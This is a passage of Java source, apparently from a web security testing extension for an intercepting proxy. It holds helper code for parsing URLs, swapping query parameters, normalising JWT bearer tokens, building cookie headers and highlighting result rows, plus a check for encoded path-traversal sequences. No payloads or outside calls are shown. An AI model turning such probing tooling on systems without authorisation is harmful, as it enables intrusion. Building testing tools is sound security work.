                int slash = path.lastIndexOf('/');
                String directory = slash >= 0 ? path.substring(0, slash + 1) : "/";
                return withPathAndQuery(uri, directory, "");
            }
        }
        return url;
    }

    private static String buildSignature(String url) {
        ParsedUrl parsed = ParsedUrl.parse(url);
        String lowerUrl = url.toLowerCase(Locale.ROOT);
        String path = parsed.path;
        if (!containsAny(lowerUrl, Arrays.asList("%2e", "%5c", "..%2f", "..%5c"))) {
            path = path.replace("//", "/");
        }
        return parsed.scheme + "|" + parsed.host.toLowerCase(Locale.ROOT) + "|" + parsed.port + "|" +
                path.toLowerCase(Locale.ROOT) + (parsed.query.isEmpty() ? "" : "?" + parsed.query);
    }

    private static String requestKey(String url) {
        ParsedUrl parsed = ParsedUrl.parse(url);
        return "GET|" + parsed.scheme + "|" + parsed.host.toLowerCase(Locale.ROOT) + "|" + parsed.port + "|" +
                parsed.requestTarget;
    }

    private static String urlWithParam(URI uri, String paramName, String value) {
        Map<String, String> params = parseQuery(rawQuery(uri));
        params.put(paramName, value);
        StringBuilder query = new StringBuilder();
        for (Map.Entry<String, String> entry : params.entrySet()) {
            if (query.length() > 0) {
                query.append('&');
            }
            query.append(entry.getKey()).append('=').append(entry.getValue());
        }
        return withPathAndQuery(uri, uri.getRawPath(), query.toString());
    }

    private static Map<String, String> parseQuery(String query) {
        Map<String, String> params = new LinkedHashMap<>();
        if (query == null || query.isEmpty()) {
            return params;
        }
        for (String pair : query.split("&")) {
            int eq = pair.indexOf('=');
            String name = eq >= 0 ? pair.substring(0, eq) : pair;
            String value = eq >= 0 ? pair.substring(eq + 1) : "";
            if (!name.isEmpty()) {
                params.put(name, value);
            }
        }
        return params;
    }

    private static String withPathAndQuery(URI uri, String rawPath, String rawQuery) {
        String path = rawPath == null || rawPath.isEmpty() ? "/" : rawPath;
        StringBuilder out = new StringBuilder();
        out.append(uri.getScheme()).append("://").append(uri.getRawAuthority()).append(path);
        if (rawQuery != null && !rawQuery.isEmpty()) {
            out.append('?').append(rawQuery);
        }
        return out.toString();
    }

    private static String hostKey(URI uri) {
        return uri.getPort() >= 0 ? uri.getHost() + ":" + uri.getPort() : uri.getHost();
    }

    private static boolean selectedHostMatches(URI uri, String selectedHost) {
        return uri.getHost() != null && hostKey(uri).equals(selectedHost);
    }

    private String selectedHost() {
        Object selected = hostCombo.getSelectedItem();
        return selected == null ? null : selected.toString();
    }

    private static String normalizeJwtToken(String token) {
        if (token == null) {
            return "";
        }
        String result = token.trim();
        if (result.toLowerCase(Locale.ROOT).startsWith("authorization:")) {
            result = result.substring(result.indexOf(':') + 1).trim();
        }
        if (result.toLowerCase(Locale.ROOT).startsWith("bearer ")) {
            result = result.substring(7).trim();
        }
        return headerValue(result);
    }

    private static String cookieHeader(Map<String, String> cookies) {
        List<String> parts = new ArrayList<>();
        cookies.forEach((name, value) -> parts.add(headerValue(name) + "=" + headerValue(value)));
        return String.join("; ", parts);
    }

    private static String responseText(HttpResponse response) {
        if (response == null) {
            return "";
        }
        try {
            return response.bodyToString() + "\n" + response.toString();
        } catch (Exception e) {
            return "";
        }
    }

    private static String preview(String content) {
        if (content == null) {
            return "";
        }
        String clean = content.replace('\r', ' ').replace('\n', ' ');
        return clean.length() > 300 ? clean.substring(0, 300) : clean;
    }

    private static String rawQuery(URI uri) {
        return uri.getRawQuery() == null ? "" : uri.getRawQuery();
    }

    private static String schemeHostPort(URI uri) {
        int port = uri.getPort();
        if (port < 0) {
            port = "https".equalsIgnoreCase(uri.getScheme()) ? 443 : 80;
        }
        return uri.getScheme().toLowerCase(Locale.ROOT) + "|" + uri.getHost().toLowerCase(Locale.ROOT) + "|" + port + "|";
    }

    private static boolean containsAny(String value, List<String> needles) {
        for (String needle : needles) {
            if (value.contains(needle)) {
                return true;
            }
        }
        return false;
    }

    private static String stripLeadingSlash(String value) {
        String result = value;
        while (result.startsWith("/")) {
            result = result.substring(1);
        }
        return result;
    }

    private static String html(String value) {
        return value == null ? "" : value.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String headerValue(String value) {
        if (value == null) {
            return "";
        }
        StringBuilder out = new StringBuilder(value.length());
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (c >= 0x20 && c != 0x7f) {
                out.append(c);
            }
        }
        return out.toString().trim();
    }

    private static String requestTarget(String value) {
        if (value == null || value.isEmpty()) {
            return "/";
        }
        for (int i = 0; i < value.length(); i++) {
            char c = value.charAt(i);
            if (c < 0x20 || c == 0x7f) {
                throw new IllegalArgumentException("Request target contains control characters");
            }
        }
        return value;
    }

    private static class ParsedUrl {
        private final String scheme;
        private final String host;
        private final int port;
        private final String hostHeader;
        private final String path;
        private final String query;
        private final String requestTarget;
        private final HttpService service;

        private ParsedUrl(String scheme, String host, int port, String hostHeader, String path, String query, String requestTarget) {
            this.scheme = scheme;
            this.host = host;
            this.port = port;
            this.hostHeader = headerValue(hostHeader);
            this.path = path;
            this.query = query;
            this.requestTarget = requestTarget(requestTarget);
            this.service = httpService(host, port, "https".equalsIgnoreCase(scheme));
        }

        private static ParsedUrl parse(String url) {
            int schemeEnd = url.indexOf("://");
            if (schemeEnd <= 0) {
                throw new IllegalArgumentException("Absolute URL required: " + url);
            }

            String scheme = url.substring(0, schemeEnd).toLowerCase(Locale.ROOT);
            if (!"http".equals(scheme) && !"https".equals(scheme)) {
                throw new IllegalArgumentException("Unsupported URL scheme: " + scheme);
            }
            int authorityStart = schemeEnd + 3;
            int authorityEnd = firstIndexOf(url, authorityStart, '/', '?', '#');
            if (authorityEnd < 0) {
                authorityEnd = url.length();
            }

            String authority = url.substring(authorityStart, authorityEnd);
            if (!authority.equals(headerValue(authority))) {
                throw new IllegalArgumentException("URL authority contains control characters");
            }
            int userInfoEnd = authority.lastIndexOf('@');
            if (userInfoEnd >= 0) {
                authority = authority.substring(userInfoEnd + 1);
            }
            if (authority.isEmpty()) {
                throw new IllegalArgumentException("Missing host in URL: " + url);
            }

            HostPort hostPort = parseHostPort(authority, "https".equals(scheme) ? 443 : 80);
            String remainder = url.substring(authorityEnd);
            int fragmentStart = remainder.indexOf('#');
            if (fragmentStart >= 0) {
                remainder = remainder.substring(0, fragmentStart);
            }
            String requestTarget = remainder.isEmpty() ? "/" : (remainder.charAt(0) == '?' ? "/" + remainder : remainder);
            int queryStart = requestTarget.indexOf('?');
            String path = queryStart >= 0 ? requestTarget.substring(0, queryStart) : requestTarget;
            String query = queryStart >= 0 ? requestTarget.substring(queryStart + 1) : "";
            if (path.isEmpty()) {
                path = "/";
            }

            return new ParsedUrl(scheme, hostPort.host, hostPort.port, authority, path, query, requestTarget);
        }

        private static HostPort parseHostPort(String authority, int defaultPort) {
            if (authority.startsWith("[")) {
                int bracketEnd = authority.indexOf(']');
                if (bracketEnd < 0) {
                    throw new IllegalArgumentException("Invalid IPv6 host: " + authority);
                }
                String host = authority.substring(1, bracketEnd);
                int port = defaultPort;
                if (authority.length() > bracketEnd + 1 && authority.charAt(bracketEnd + 1) == ':') {
                    port = Integer.parseInt(authority.substring(bracketEnd + 2));
                }
                return new HostPort(host, port);
            }

            int colon = authority.lastIndexOf(':');
            if (colon > 0 && authority.indexOf(':') == colon) {
                return new HostPort(authority.substring(0, colon), Integer.parseInt(authority.substring(colon + 1)));
            }
            return new HostPort(authority, defaultPort);
        }

        private static int firstIndexOf(String value, int start, char... chars) {
            int result = -1;
            for (char c : chars) {
                int index = value.indexOf(c, start);
                if (index >= 0 && (result < 0 || index < result)) {
                    result = index;
                }
            }
            return result;
        }
    }

    private static class HostPort {
        private final String host;
        private final int port;

        private HostPort(String host, int port) {
            this.host = host;
            this.port = port;
        }
    }

    private static String stackTrace(Exception e) {
        StringBuilder out = new StringBuilder(e.toString());
        for (StackTraceElement element : e.getStackTrace()) {
            out.append("\n    at ").append(element);
        }
        return out.toString();
    }

    private static <T> List<T> joinLists(List<T> first, List<T> second) {
        List<T> joined = new ArrayList<>(first);
        joined.addAll(second);
        return joined;
    }

    private static class GreenHitRenderer extends DefaultTableCellRenderer {
        @Override
        public Component getTableCellRendererComponent(JTable table, Object value, boolean isSelected, boolean hasFocus, int row, int column) {
            Component component = super.getTableCellRendererComponent(table, value, isSelected, hasFocus, row, column);
            component.setBackground(isSelected ? new Color(0, 120, 0) : new Color(190, 255, 190));
            component.setForeground(isSelected ? Color.WHITE : Color.BLACK);
            return component;
        }
    }
}
